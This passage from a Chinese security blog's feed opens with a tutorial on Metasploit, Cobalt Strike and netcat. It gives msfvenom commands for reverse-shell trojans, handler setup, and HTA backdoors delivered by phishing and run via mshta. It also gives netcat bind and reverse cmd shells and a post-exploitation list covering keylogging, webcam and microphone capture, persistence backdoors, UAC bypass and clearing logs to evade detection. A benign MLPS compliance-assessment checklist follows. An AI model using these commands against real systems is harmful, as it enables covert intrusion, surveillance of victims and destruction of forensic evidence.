variable">LPORT</span><span class="token operator">=</span>控制机端口-f   raw <span class="token operator">&gt;</span> shell.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-5-实战"><a href="#1-5-实战" class="headerlink" title="1.5  实战"></a>1.5  实战</h3><p>生成恶意exe木马，在测试机上运行，在服务器进行反向连接</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LPORT=8888 LHOST=192.168.10.27  -f -o shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>原理是让测试机运行木马后 连接 控制机ip：端口</p><p>进入msf控制台，完成以下配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf <span class="token operator">&gt;</span> use exploit/multi/handler  <span class="token comment">#使用exploit/multi/handler监听从肉鸡发来的数据</span>msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp  <span class="token comment">#设置payload，不同的木马设置不同的payload</span>msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.10.27  <span class="token comment">#我们的主机ip</span>msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lport <span class="token number">8888</span>            <span class="token comment">#我们的主机端口</span>msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在测试机上运行木马</p><p><img src="http://img.ex1t.xyz/20201230174312.png"></p><p>连接成功</p><h3 id="1-6-后渗透"><a href="#1-6-后渗透" class="headerlink" title="1.6  后渗透"></a>1.6  后渗透</h3><p>连接成功后的一些操作</p><pre class="line-numbers language-none"><code class="language-none">run post/windows/gather/checkvm   判断是否是虚拟机蜜罐keyscan_start：开始键盘记录keyscan_dump：下载键盘记录keyscan_stop：结束键盘记录record_mic：录制声音（如果目标主机上有话筒的话）    -d ：记录的秒数，默认为1秒webcam_chat：查看摄像头接口webcam_list：查看摄像头列表webcam_stream：获取摄像头视频run vnc：开启远程桌面webcam_stream 开启摄像头webcam_snap 隐秘拍照功能 -i 1 或者2是开启前置摄像头和后置摄像头的uictl disable mouse  #禁用鼠标uictl disable keyboard  #禁用键盘uictl enable mouse  #开启鼠标getpid    # 获取当前进程的pidps   # 查看当前活跃进程migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中kill &lt;pid值&gt;   #杀死进程shell 进入cmdrun persistence -S - U -X -i 10 -r 控制机ip -p 控制机端口    持久后门Meterpreter使用background来保存当前会话到后台session查看后台会话 sessions 可以查看已经成功获取的会话 可以使用sessions -i 连接到指定序号的meterpreter会话已继续利用 shell命令 获取目标主机的远程命令行shell(cmd)提权use exploit/windows/local/bypassuac_eventvwr命令进入该模块设置session为你要使用的sessionclearev 清除日志跑路<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、CobaltStrike"><a href="#2、CobaltStrike" class="headerlink" title="2、CobaltStrike"></a>2、CobaltStrike</h2><h3 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1  简介"></a>2.1  简介</h3><p>是一款渗透测试神器，被业界人称为CS神器。CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</p><h3 id="2-2-下载安装"><a href="#2-2-下载安装" class="headerlink" title="2.2  下载安装"></a>2.2  下载安装</h3><pre class="line-numbers language-none"><code class="language-none">链接：https://pan.baidu.com/s/1ASUKsjtEr6roVdMVMmhUsg 提取码：8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>首先部署在linux服务器，默认使用的是50050端口,用户名是neo</p><pre class="line-numbers language-none"><code class="language-none">nohup ./teamserver 服务器ip 登陆密码 &gt;/dev/null 2&gt;&amp;1 &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>nobup是后台运行</p><p>然后客户端连接，windows运行start.bat</p><p><img src="http://img.ex1t.xyz/20201230174110.png"></p><p><strong>连接成功</strong></p><p><img src="http://img.ex1t.xyz/20201230174121.png"></p><h3 id="2-3-实战"><a href="#2-3-实战" class="headerlink" title="2.3 实战"></a>2.3 实战</h3><p><strong>首先建立Listener（监听器）</strong></p><p><strong>Cobait Strike-&gt;监听器-&gt;add</strong></p><p><img src="http://img.ex1t.xyz/20201230174137.png"></p><p><strong>分别是服务器ip，服务器ip，服务器端口</strong></p><p><strong>生成后门，介绍一种</strong></p><p><strong>攻击-&gt;生成后门-&gt;HTML Application</strong></p><p><img src="http://img.ex1t.xyz/20201230174156.png"></p><p>选择刚配置的监听器</p><p>然后保存文件</p><p>然后配置文件下载</p><p>攻击-&gt;钓鱼攻击-&gt;文件下载</p><p>选择你之前生成的木马文件。</p><p>会生成一个下载链接</p><p>测试机执行</p><pre class="line-numbers language-none"><code class="language-none">mshta http://ip:80/download/file1.ext<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或下载运行</p><p>已连接机器图，然后右击进行各类操作</p><p><img src="http://img.ex1t.xyz/20201230174209.png"></p><p>剩下的还是自己摸索这玩吧</p><h2 id="接下来说一下MSF和CS联动"><a href="#接下来说一下MSF和CS联动" class="headerlink" title="接下来说一下MSF和CS联动"></a>接下来说一下MSF和CS联动</h2><h3 id="1-1-MSF转移到CS"><a href="#1-1-MSF转移到CS" class="headerlink" title="1.1  MSF转移到CS"></a>1.1  MSF转移到CS</h3><p>简单方法进入cmd运行下</p><pre class="line-numbers language-none"><code class="language-none">mshta http://ip:80/download/file1.ext<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">复杂一点的use exploit/windows/local/payload_inject（选用exploit）set payload windows/x64/meterpreter/reverse_http（选用的payload一定要跟cs下监听的payload方式一样）set DisablePayloadHandler true（禁止产生一个新的handler）set LHOST IP（ip为cs监听会话用的ip）set LPORT 端口（端口为cs对应的接受反弹shell的端口）set pid 进程号（设置派生给cs后木马进程的pid进程号，如果有system权限则可以指定一个具有system权限的进程，这样cs接收到会话也是最高权限）set session 1（设置需要派送的meterpreter）exploit（开始执行）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-CS转移到MSF"><a href="#1-2-CS转移到MSF" class="headerlink" title="1.2  CS转移到MSF"></a>1.2  CS转移到MSF</h3><p>msf配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler <span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_http（跟cs上选用的payload一样）<span class="token builtin class-name">set</span> lhost 本机ip <span class="token builtin class-name">set</span> lport 接受的端口 exploit 执行 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后cs上，右击测试机-&gt;增加会话</p><p>增加监听器，payload选择Foreign HTTP，然后配置</p><p><img src="http://img.ex1t.xyz/20201230174221.png"></p><p>然后选择这个监听器，就转移到msf上去了</p><h2 id="3、nc（Netcat-瑞士军刀）"><a href="#3、nc（Netcat-瑞士军刀）" class="headerlink" title="3、nc（Netcat/瑞士军刀）"></a>3、nc（Netcat/瑞士军刀）</h2><h3 id="1-1-简介-1"><a href="#1-1-简介-1" class="headerlink" title="1.1  简介"></a>1.1  简介</h3><p>可以读写TCP或UDP网络连接，，能被其它的程序或脚本直接驱动。同时，它又是一个功能丰富的网络调试和开发工具，它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能，它基于socket协议工作。在渗透测试领域，我们通常利用它来反弹shell。</p><p>nc端口扫描最主要的用途是，内网，我们的nmap工具是不能扫描到内网的，所以这时我们可以把nc上传到web服务器上，利用它来扫描内网主机。而由于nc体积很小，所以不容易被发现。</p><h3 id="1-2-下载安装-1"><a href="#1-2-下载安装-1" class="headerlink" title="1.2 下载安装"></a>1.2 下载安装</h3><p>这个自己网上下载吧，很容易找到</p><h3 id="1-3-使用说明-1"><a href="#1-3-使用说明-1" class="headerlink" title="1.3 使用说明"></a>1.3 使用说明</h3><pre class="line-numbers language-none"><code class="language-none">-l： 开启监听 ·-p：指定端口 ·-t： 以telnet形式应答 -e：程序重定向 -n：以数字形式表示ip -v：显示执行命令过程 -z :  不进行交互，直接显示结果 -u ：使用UDP协议传输 -w :  设置超时时间 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-4-功能实现"><a href="#1-4-功能实现" class="headerlink" title="1.4 功能实现"></a>1.4 功能实现</h3><h4 id="1-4-1-建立简单的聊天室"><a href="#1-4-1-建立简单的聊天室" class="headerlink" title="1.4.1  建立简单的聊天室"></a>1.4.1  建立简单的聊天室</h4><p>服务器端： nc   -lvp    8888     #监听8888端口   客户端： nc  -nv  ip  8888    #连接到服务器的8888端口 </p><p>然后双发输入,对方都能看得到</p><h4 id="1-4-2-传文件"><a href="#1-4-2-传文件" class="headerlink" title="1.4.2  传文件"></a>1.4.2  传文件</h4><pre class="line-numbers language-none"><code class="language-none">服务器端： nc  -lvp  8888 &lt; test.txt 客户端： nc -nv ip 8888 &gt; te<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>st.txt </p><h4 id="1-4-3-正向连接"><a href="#1-4-3-正向连接" class="headerlink" title="1.4.3  正向连接"></a>1.4.3  正向连接</h4><p>肉鸡开放8888端口作为cmd执行 </p><pre class="line-numbers language-none"><code class="language-none">nc -lvv -p 8888 -t -e cmd.exe <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们的主机访问肉鸡的8888 </p><pre class="line-numbers language-none"><code class="language-none">nc  -nvv  肉鸡ip  8888 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-4-4-反向连接"><a href="#1-4-4-反向连接" class="headerlink" title="1.4.4  反向连接"></a>1.4.4  反向连接</h4><p>我们的主机</p><pre class="line-numbers language-none"><code class="language-none">nc  -lvp  8888 nc  -t -e cmd.exe  控制机ip 8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 未完待续</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>   工具还有.了解大概功能和原理，以后需要的时候就能直接使用。等有空的时候再写一点。<br>   文章若存在问题，敬请指正。</p><p>以上仅供学习交流，严禁用于违法途径（手动狗头）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>等保测评之安全物理环境、安全管理</title>
      <link href="/2020/08/27/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84%E4%B9%8B%E5%AE%89%E5%85%A8%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E3%80%81%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86/"/>
      <url>/2020/08/27/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84%E4%B9%8B%E5%AE%89%E5%85%A8%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E3%80%81%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="一、测评方法"><a href="#一、测评方法" class="headerlink" title="一、测评方法"></a>一、测评方法</h2><h3 id="1-1-测评工具"><a href="#1-1-测评工具" class="headerlink" title="1.1.  测评工具"></a>1.1.  测评工具</h3><ul><li>安全管理测评指导书</li><li>安全物理环境测评作业指导书</li></ul><h3 id="1-2-作业指导书开发基本步骤"><a href="#1-2-作业指导书开发基本步骤" class="headerlink" title="1.2. 作业指导书开发基本步骤"></a>1.2. 作业指导书开发基本步骤</h3><ul><li>第一步：从《基本要求中》选择‘控制点’（测评指标）和要求项（测评项）</li><li>第二步：从《测评要求》中选择”测评方法“</li><li>第三步：结合信息系统实际情况调整”测评方法“</li><li>第四步最终形成作业指导书</li></ul><h3 id="1-3-测评方式"><a href="#1-3-测评方式" class="headerlink" title="1.3. 测评方式"></a>1.3. 测评方式</h3><ul><li>访谈</li><li>核查</li></ul><h3 id="1-4-核查与访谈的关系"><a href="#1-4-核查与访谈的关系" class="headerlink" title="1.4. 核查与访谈的关系"></a>1.4. 核查与访谈的关系</h3><ul><li> 通过访谈获得肯定的答案，通过核查验证访谈结果。</li></ul><h3 id="1-5-访谈技巧访谈技巧"><a href="#1-5-访谈技巧访谈技巧" class="headerlink" title="1.5. 访谈技巧访谈技巧"></a>1.5. 访谈技巧访谈技巧</h3><ul><li>基于作业指导书开展</li><li>访谈对象的选择，覆盖适当的层次和职能；</li><li>访谈应在正常的工作时间和工作地点</li><li>说明访谈和做记录的原因</li><li>访谈可以从请对方描述工作开始</li><li>尽量避免有倾向性答案的问题</li><li>感谢对方配合</li></ul><h3 id="1-6-询问问题"><a href="#1-6-询问问题" class="headerlink" title="1.6. 询问问题"></a>1.6. 询问问题</h3><ul><li>开放式和非开放式<h3 id="1-7-核查核查"><a href="#1-7-核查核查" class="headerlink" title="1.7. 核查核查"></a>1.7. 核查核查</h3></li><li>是指测评人员通过对测评对象进行观察、查验、分析等活动，获取证据以证明其安全保护措施是否有效的一种方法<h3 id="1-8-核查对象核查对象"><a href="#1-8-核查对象核查对象" class="headerlink" title="1.8. 核查对象核查对象"></a>1.8. 核查对象核查对象</h3></li><li>各类文件-制度文档</li><li>操作规程-执行记录</li><li>物理环境-基础础设施</li></ul><h2 id="二、安全管理测评流程"><a href="#二、安全管理测评流程" class="headerlink" title="二、安全管理测评流程"></a>二、安全管理测评流程</h2><h3 id="2-1-基本活动基本活动"><a href="#2-1-基本活动基本活动" class="headerlink" title="2.1. 基本活动基本活动"></a>2.1. 基本活动基本活动</h3><ul><li>核查是否存在有关的规定、制度或规程文档；</li><li>核查文档的描述细节是否设计相关的内容；</li><li>核查是否存在有关执行过程的记录文件或说明文件（证据）</li><li>核查文件的记录内容是否与规定、制度或规程要求一致；</li><li>访谈相关人员，要求其对描述不理解或者记录不理解内容的解释或说明</li><li>访谈相关人员，要求其对管理过程或执行过程解释和说明。</li></ul><h3 id="2-2-测评流程测评流程"><a href="#2-2-测评流程测评流程" class="headerlink" title="2.2. 测评流程测评流程"></a>2.2. 测评流程测评流程</h3><ul><li>第一步，根据现场配合人员名单，进一步明确协调人员、访谈人员及时间</li><li>第二步，根据检查文档列表，获得制度、记录、规程等各类文档，并填写文档交接单；</li><li>第三步，审阅各类文档，并在现场测评作业指导书的相关项中进行结果记录</li><li>第四步，针对不确定项访谈相关人员或获得额外证据并记录；</li><li>第五步，整理作业指导书的结果记录，并确认签字</li><li>第六步，归还所有文档，并在文档交接单中签字。</li></ul><h2 id="三、安全物理环境测评流程"><a href="#三、安全物理环境测评流程" class="headerlink" title="三、安全物理环境测评流程"></a>三、安全物理环境测评流程</h2><h3 id="3-1-基本活动基本活动"><a href="#3-1-基本活动基本活动" class="headerlink" title="3.1. 基本活动基本活动"></a>3.1. 基本活动基本活动</h3><ul><li>实地察看场地条件、环境条件是否符合要求</li><li>实地察看设备、设施是否工作正常</li><li>实地查看是否存在有关设备、设施、标签、标识等；</li><li>核查设备、设施的检查报告或维护日志、核查机房设计验收文档</li><li>访谈相关人员，要求对不理解之处进行解释说明；</li><li>访谈相关人员，要求对管理过程或执行过程补充解释和说明</li></ul><h3 id="3-2-测评流程测评流程"><a href="#3-2-测评流程测评流程" class="headerlink" title="3.2. 测评流程测评流程"></a>3.2. 测评流程测评流程</h3><ul><li>第一步，针对安全物理环境的测评项访谈相关人员</li><li>第二步，实地查看场地、环境条件以及设备、设施运行状态；</li><li>第三步，实地查看存在的有关设备、设施运行状态；</li><li>第四步，检查检测报告或维护日志、检查机房设计验收文档（可在进机房前完成）；</li><li>第五步，针对不确定项访谈相关人员；</li><li>第六步，整理作业指导书，整理结果记录并确认签字</li></ul><h3 id="3-3-测评要点测评要点"><a href="#3-3-测评要点测评要点" class="headerlink" title="3.3. 测评要点测评要点"></a>3.3. 测评要点测评要点</h3><ul><li>机房、建筑的各类设计/验收文档（机房位置选择说明、机房建筑承受能力、机房建筑防雷、机房综合布线及接地、自动消防系统、机房防火和新风系统、电力供应和电磁防护等）；</li><li>机房配备电子门禁系统、分区管理、登录记录、专人陪同；</li><li>设备和线路贴不易去除标识；</li><li>设置专人值守的视频监控系统或机房报警系统；</li><li>电源线和信号线上的防雷措施（光纤接入除外）</li><li>自动消防报警系统运行状态、手提式或便携式灭火器的摆放位置及有效期、消防演习记录</li><li>机房天花板及墙壁是否存在防潮及结露现象，机房屋顶或活动办下面是否有水管、对为开放窗户的防雨措施；</li><li>机房空调温度显示、机房日常巡检温度记录；</li><li>双路师电接入、ups满负荷时最大负载、备用供电系统，电力供应应急演练记录。</li></ul><h3 id="3-4-测评难点测评难点"><a href="#3-4-测评难点测评难点" class="headerlink" title="3.4. 测评难点测评难点"></a>3.4. 测评难点测评难点</h3><ul><li>机房防盗报警系统</li><li>机房区域防火隔离</li><li>双路市电供电或备用供电系统。</li></ul><h3 id="3-5-安全物理环境测评注意事项"><a href="#3-5-安全物理环境测评注意事项" class="headerlink" title="3.5. 安全物理环境测评注意事项"></a>3.5. 安全物理环境测评注意事项</h3><ul><li>事项一：现场查看机房基础设施建设情况时，设施的有无并不能反映落实与否，关键查看设施是否有效的、正常运行；</li><li>事项二：当机房根据用途不同分为多个房间，处于不同位置时，各个机房应按相关的物理要求分别检查。</li></ul><h2 id="四、安全管理制度"><a href="#四、安全管理制度" class="headerlink" title="四、安全管理制度"></a>四、安全管理制度</h2><h3 id="4-1-测评要点"><a href="#4-1-测评要点" class="headerlink" title="4.1. 测评要点"></a>4.1. 测评要点</h3><ul><li>总体方针政策文件、各类管理制度、各种操作规范及记录表单四类文档；</li><li>四类文档间的连贯性、完备性以及管理制度的覆盖面</li><li>管理制度文件格式、版本、装订记录、各种评审记录以及发放等级记录；</li><li>制定和修订方面的文字具体要求，修订计划，修订流程；</li><li>安全管理制度、修订的责任人、具体制定、发布流程。</li></ul><h3 id="4-2-管理制度文件体系管理制度文件体系"><a href="#4-2-管理制度文件体系管理制度文件体系" class="headerlink" title="4.2. 管理制度文件体系管理制度文件体系"></a>4.2. 管理制度文件体系管理制度文件体系</h3><ul><li>第一层 安全方针政策  信息啊暖方针政策，总体安全，说明机构安全工作的总体目标、范围、原则和安全框架等</li><li>第二层 安全管理制度 对安全管理活动中的各类管理建立安全制度管理，约束管理行为。</li><li>第三层 技术标准、规范 安全管理制度的具体技术实现细节，对管理人员或者操作人员的日常管理操作建立操作规程</li><li>第四层 流程、表单、记录 安全制度、规范实施所需履行的流程，及需填写的表单，用于记录数据、监控实施。<h3 id="4-3-测评难点测评难点"><a href="#4-3-测评难点测评难点" class="headerlink" title="4.3. 测评难点测评难点"></a>4.3. 测评难点测评难点</h3></li><li>安全方针、管理制度、操作规程以及记录表单四类文件形成管理制度文件体系；</li><li>管理制度定期的评审、修订、完善。</li><li>安全管理机构<h3 id="4-4-测评要点测评要点"><a href="#4-4-测评要点测评要点" class="headerlink" title="4.4. 测评要点测评要点"></a>4.4. 测评要点测评要点</h3></li><li>查看岗位职责文件了解：安全管理组织构成情况，信息安全领导小组-信息安全管理工作的职能部门-具体岗位，具体职责分工情况；</li><li>机构人员及岗位人员配备情况(如安全管理员、系统管理员、网络管理员、审计员）；</li><li>根据岗位人员配备名单了解安全管理员是否时专职人员，其它岗位人员配备情况。</li><li>审批事项、审批部门、批准人及审批程序等（制度），审批过程实际执行记录，了解授权和审批情况；</li><li>沟通和合作情况，了解部门内外沟通和合作情况，各类会议纪要、外协单位联系档案等；</li><li>安全检查周期、内容、程序等，各类安全检查表格、以往安全检查记录或总结了解对信息系统的安全检查情况。<h3 id="4-5-测试难点测试难点"><a href="#4-5-测试难点测试难点" class="headerlink" title="4.5. 测试难点测试难点"></a>4.5. 测试难点测试难点</h3></li><li>网络安全领导小组或网络安全管理委员会的发布文件或授权文件；</li><li>专职安全管理员</li><li>对重要活动的逐级审批制度</li><li>定期的全面安全检查</li></ul><h2 id="五、安全管理人员"><a href="#五、安全管理人员" class="headerlink" title="五、安全管理人员"></a>五、安全管理人员</h2><h3 id="5-1-测评要点测评要点"><a href="#5-1-测评要点测评要点" class="headerlink" title="5.1. 测评要点测评要点"></a>5.1. 测评要点测评要点</h3><ul><li>录用、离岗、安全意识教育和培训方面的管理要求；</li><li>安全保密协议和关键岗位的安全协议；</li><li>离岗交接记录；</li><li>安全技能考核记录</li><li>培训计划和培训记录</li><li>外部人员访问方面的管控措施</li></ul><h3 id="5-2-测评难点测评难点"><a href="#5-2-测评难点测评难点" class="headerlink" title="5.2. 测评难点测评难点"></a>5.2. 测评难点测评难点</h3><ul><li>关键岗位人员的社会背景审查，关键岗位安全协议</li><li>安全技能和安全认知的考核</li><li>对外部人员允许访问的区域、系统、设备、信息等内容的详细书面规定。</li></ul><h2 id="六、安全建设管理"><a href="#六、安全建设管理" class="headerlink" title="六、安全建设管理"></a>六、安全建设管理</h2><h3 id="6-1-测评要点测评要点"><a href="#6-1-测评要点测评要点" class="headerlink" title="6.1. 测评要点测评要点"></a>6.1. 测评要点测评要点</h3><ul><li>测评对象的定级报告、备案证书；</li><li>测评对象的安全保护等级与其它级别保护对象关系的整体规划方案；</li><li>安全设计方案、工程实施方案</li><li>软件开发、产品采购、工程实施、测试验收、系统交付等方面的管控措施；</li><li>过程控制记录、各个阶段产品评审记录、测试验收报告；与服务供应商签订的保密协议或安全责任书。</li></ul><h3 id="6-2-测评难点测评难点"><a href="#6-2-测评难点测评难点" class="headerlink" title="6.2. 测评难点测评难点"></a>6.2. 测评难点测评难点</h3><ul><li>对主要的活动均需要遵循制度要求，规范化地执行各种活动，留有记录文件；</li><li>外包开发软件安装前的恶意代码检测和后门程序审查。</li></ul><h2 id="七、安全运维管理"><a href="#七、安全运维管理" class="headerlink" title="七、安全运维管理"></a>七、安全运维管理</h2><h3 id="7-1-环境管理"><a href="#7-1-环境管理" class="headerlink" title="7.1. 环境管理"></a>7.1. 环境管理</h3><ul><li>指定专门的部门或者人员负责机房安全</li><li>机房安全管理制度，机房基础设施定期维护记录、机房进出登记记录；</li><li>重要的区域安全管理</li></ul><h3 id="7-2-资产管理"><a href="#7-2-资产管理" class="headerlink" title="7.2. 资产管理"></a>7.2. 资产管理</h3><ul><li>编制与保护对象相关事务资产清单；</li><li>根据资产清单以及重要程度，经行标识和选择相应的管理措施；</li><li>对信息分类标识的原则和方法进行说明的文档</li></ul><h3 id="7-3-介质管理"><a href="#7-3-介质管理" class="headerlink" title="7.3. 介质管理"></a>7.3. 介质管理</h3><ul><li>介质本地、异地存储环境条件，分类和标识；</li><li>介质物理传输过程进行控制，并对查询和归档进行等级。</li></ul><h3 id="7-4-设备维护管理"><a href="#7-4-设备维护管理" class="headerlink" title="7.4. 设备维护管理"></a>7.4. 设备维护管理</h3><ul><li>指定设备万里负责人或负责部门</li><li>建立配套设施、软硬件维护方面的管理制度</li><li>设备带离机房或者办公环境的管控措施</li><li>含有存储介质的设备在报废或重用前，应进行完全的清除或被安全覆盖。<h3 id="7-5-漏洞和风险管理"><a href="#7-5-漏洞和风险管理" class="headerlink" title="7.5. 漏洞和风险管理"></a>7.5. 漏洞和风险管理</h3></li><li>采取必要的措施识别安全漏洞和隐患，采取相应的控制手段和措施；</li><li>应定期开展安全测评，采取措施应对测评发现的安全问题。<h3 id="7-6-网络和系统安全管理"><a href="#7-6-网络和系统安全管理" class="headerlink" title="7.6. 网络和系统安全管理"></a>7.6. 网络和系统安全管理</h3></li><li>应划分不同的管理员角色进行网络和系统的运维管理</li><li>应建立网络和系统方面的安全管理制度、操作手册、规程；</li><li>日常工作，包括本地用户和远程用户的访问管理、网络接入管理、网络设备管理、漏洞扫描、网络状态监控、检测和报警、账户管理、角色权限管理、补丁管理、日志或审计信息分析、日常维护等；</li><li>应严格控制变更性运维（运维工具、运程运维的开通）<h3 id="7-7-恶意代码防范管理"><a href="#7-7-恶意代码防范管理" class="headerlink" title="7.7. 恶意代码防范管理"></a>7.7. 恶意代码防范管理</h3></li><li>提高所有用户的恶意代码防范意识，对外来计算机或存储设备接入需进行检查</li><li>应定期验证防范恶意代码攻击的技术措施的有效性<h3 id="7-8-配置管理"><a href="#7-8-配置管理" class="headerlink" title="7.8. 配置管理"></a>7.8. 配置管理</h3></li><li>应记录和保存基本配置信息，如网络拓扑结构、各设备安装的软件组件、版本、配置参数等；</li><li>基本配置信息改变纳入变更范畴，实施对配置信息改变进行控制并及时更新。<h3 id="7-9-密码管理"><a href="#7-9-密码管理" class="headerlink" title="7.9. 密码管理"></a>7.9. 密码管理</h3></li><li>应遵循密码相关国家标准和行业标准</li><li>使用密码主管部门认证核准的密码技术产品。<h3 id="7-10-变更管理"><a href="#7-10-变更管理" class="headerlink" title="7.10. 变更管理"></a>7.10. 变更管理</h3></li><li>应明确变更控制策略；</li><li>应建立变更的申报和审批控制程序</li><li>变更审批记录</li><li>变更后相关的管理制度和操作规程的变化</li><li>失败变更的恢复文件化程度及恢复过程的演练记录<h3 id="7-11-备份和恢复管理"><a href="#7-11-备份和恢复管理" class="headerlink" title="7.11. 备份和恢复管理"></a>7.11. 备份和恢复管理</h3></li><li>识别需要定期备份的重要业务信息、数据、系统等</li><li>备份和恢复的策略文档及操作规程，如备份方式、频度、介质、保存周期等；</li><li>数据的备份策略和恢复策略以及备份程序和恢复程序；</li><li>备份介质的有效性检查记录。</li></ul><h3 id="7-12-安全事件处理"><a href="#7-12-安全事件处理" class="headerlink" title="7.12 安全事件处理"></a>7.12 安全事件处理</h3><ul><li>应及时向安全管理部门报告所发现的安全弱点和可疑事件；</li><li>安全事件报告和处置管理制度，包括安全事件定义、定级、报告流程、不同事件的响应和处置流程；</li><li>安全事件处置过程的记录</li><li>应急预案管理</li><li>应急预案总体框架</li><li>各类主要事件的具体应急预案；</li><li>应急预案涉及人员、设备等的资源满足情况</li><li>应急预案的培训记录、演练记录。</li></ul><h3 id="7-13-外包运维管理"><a href="#7-13-外包运维管理" class="headerlink" title="7.13. 外包运维管理"></a>7.13. 外包运维管理</h3><ul><li>外包运维服务商的选择符合规定；</li><li>签订协议，明确外包运维范围、工作内容、明确相关安全要求；</li><li>在技术方面和管理方面均具有按照等级保护要求开展运维工作能力。</li></ul><h2 id="八、-测评难点"><a href="#八、-测评难点" class="headerlink" title="八、 测评难点"></a>八、 测评难点</h2><ul><li>重要区域的安全管理</li><li>信息分类标识的原则和方法；</li><li>重要介质中数据或软件的加密存储；</li><li>安全审计的集中管理；</li><li>定期的网络和系统的漏洞扫描</li><li>对移动时、便携式设备接入网络安全管理</li><li>对违规联网行为的管理。</li><li>系统运行日志和审计数据分析</li><li>系统角色权限的划分和管理</li><li>变更失败的文件化恢复程序，变更失败的恢复演练</li><li>变更后对相关制度和操作规程修订</li><li>数据恢复或系统切换操作记录，备份介质的有效性检查；</li><li>信息安全事件的应急预案，应急预案培训和演练；</li><li>应急预案文档的维护和更新</li></ul><h2 id="九、安全管理测评注意事项"><a href="#九、安全管理测评注意事项" class="headerlink" title="九、安全管理测评注意事项"></a>九、安全管理测评注意事项</h2><ul><li>事项一：系统某控制点或某条要求不适合该级别的基本要求（如外包开发、自行软件开发）；一定不要滥用“不适用”若果某条没达到要求，由于下面一条要求预期是有关联关系，那么这条要求不能说不适用而是不符合。或者说只能由不是用推到到不适用，而不能由不符合推到为不适用</li><li>事项二、当访谈结果与检查结果不一致，应综合分析，不能片面采信任一方。</li><li>事项三:访谈以具体对象展开，而不以控制点或要求展开;</li><li>事项四:访谈是获得证据不可或缺的手段，但往往访谈回答信息的客观性、准确性，依被访谈角色对相关内容了解程度、以及双方的有效沟通而定，因此需要测评人员正确引导和判断;</li><li>事项五:在检查文档时发现不同文档针对同一方面内容要求不一致，应分析原因，结合其他测评方式所获证据来判断;事项六:所检查的文档应是机构目前已正式发布实施的有效文档;</li><li>事项七:制度文档的审阅一方面要检查制度文档的规范内容，另外应通过审阅记录文档检查制度文档的落实，若二者存在不致，应进一步寻找证据，最终确认是制度未得到有效落实还是制度文档需要修订有效落实还是制度文档需要修订;</li><li>事项八:其他测评项获取的证据，也可能会成为某一测评项判定的依据;</li><li>事项九:当由于某种原因机构无法提供原有的所要求的证据时其他证据效力等同时，可采纳;</li><li>事项十:文档名称可能不同，需进一步确认文档具体内容。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 等保测评 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql数据库学习笔记之数据库及MySQL基础</title>
      <link href="/2020/08/27/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8Asql%E5%9F%BA%E7%A1%80/"/>
